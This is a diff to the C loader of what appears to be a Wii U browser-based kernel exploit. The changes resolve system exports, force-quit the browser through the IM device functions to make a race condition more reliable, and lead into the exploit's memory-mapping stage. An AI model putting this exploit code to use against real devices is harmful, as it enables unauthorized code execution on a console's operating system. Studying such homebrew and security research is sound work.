@@ -1,21 +1,28 @@
 #include "loader.h"
 
-/* Start of our code */
+/* Initial setup code stolen from Pong, makes race much more reliable */
 void _start()
 {
-	/* Load a good stack */
+	// Notify the user if the kernel version is not implemented
+	if(KERN_SYSCALL_TBL == 0)
+	{
+		OSFatal("Your kernel version has not been implemented yet");
+	}
+
+	//Load a good stack
 	asm(
 		"lis %r1, 0x1ab5 ;"
 		"ori %r1, %r1, 0xd138 ;"
 	);
- 
-	/* Get a handle to coreinit.rpl */
+
 	unsigned int coreinit_handle;
 	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);
-
-	/* OS memory functions */
-	void* (*memcpy)(void *dest, void *src, uint32_t length);
-	void* (*OSAllocFromSystem)(uint32_t size, int align);
+	
+	//OS Memory functions
+	void*(*memset)(void *dest, uint32_t value, uint32_t bytes);
+	void*(*memcpy)(void *dest, void *src, uint32_t length);
+	void*(*OSAllocFromSystem)(uint32_t size, int align);
+	void (*OSFreeToSystem)(void *ptr);
 	void (*DCFlushRange)(void *buffer, uint32_t length);
 	void (*DCInvalidateRange)(void *buffer, uint32_t length);
 	void (*ICInvalidateRange)(void *buffer, uint32_t length);
@@ -25,23 +32,48 @@ void _start()
 	bool (*OSCreateThread)(void *thread, void *entry, int argc, void *args, uint32_t stack, uint32_t stack_size, int32_t priority, uint16_t attr);
 	int32_t (*OSResumeThread)(void *thread);
 	void (*OSYieldThread)();
+	
+	//IM functions
+	int(*IM_SetDeviceState)(int fd, void *mem, int state, int a, int b);
+	int(*IM_Close)(int fd);
+	int(*IM_Open)();
 
 	/* Exit functions */
 	void (*__PPCExit)();
 	void (*_Exit)();
-
+	
 	/* Read the addresses of the functions */
+	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
 	OSDynLoad_FindExport(coreinit_handle, 0, "memcpy", &memcpy);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSFreeToSystem", &OSFreeToSystem);
 	OSDynLoad_FindExport(coreinit_handle, 0, "DCFlushRange", &DCFlushRange);
 	OSDynLoad_FindExport(coreinit_handle, 0, "DCInvalidateRange", &DCInvalidateRange);
 	OSDynLoad_FindExport(coreinit_handle, 0, "ICInvalidateRange", &ICInvalidateRange);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSEffectiveToPhysical", &OSEffectiveToPhysical);
+	
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &OSCreateThread);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &OSResumeThread);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSYieldThread", &OSYieldThread);
+	
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_SetDeviceState", &IM_SetDeviceState);
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Close", &IM_Close);
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Open", &IM_Open);
+	
 	OSDynLoad_FindExport(coreinit_handle, 0, "__PPCExit", &__PPCExit);
 	OSDynLoad_FindExport(coreinit_handle, 0, "_Exit", &_Exit);
+	
+	//Restart system to get lib access
+	int fd = IM_Open();
+	void *mem = OSAllocFromSystem(0x100, 64);
+	memset(mem, 0, 0x100);
+	//set restart flag to force quit browser
+	IM_SetDeviceState(fd, mem, 3, 0, 0); 
+	IM_Close(fd);
+	OSFreeToSystem(mem);
+	//wait a bit for browser end
+	unsigned int t1 = 0x1FFFFFFF;
+	while(t1--) ;
 
 	/* Skip the whole exploit if 0xa0000000 is already mapped */
 	if (OSEffectiveToPhysical((void*)0xa0000000) != 0)
